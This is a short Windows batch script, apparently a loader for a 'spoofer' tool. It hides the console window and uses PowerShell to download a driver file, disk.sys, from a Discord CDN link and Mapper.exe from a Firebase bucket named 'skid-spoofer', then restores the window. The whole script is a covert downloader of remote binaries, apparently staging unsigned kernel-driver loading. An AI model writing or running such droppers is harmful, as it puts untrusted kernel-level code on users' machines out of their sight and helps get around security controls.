powershell -window hidden -command ""
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/966662662949830676/1029214600685699122/disk.sys', 'disk.sys')"
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/966662662949830676/1029214600685699122/disk.sys -OutFile disk.sys"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/skid-spoofer.appspot.com/o/Mapper.exe?alt=media&token=9d43c760-46f2-4a23-95b5-40ebe3a20149', 'Mapper.exe')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/skid-spoofer.appspot.com/o/Mapper.exe?alt=media&token=9d43c760-46f2-4a23-95b5-40ebe3a20149 -OutFile Mapper.exe"
exit
powershell -window normal -command ""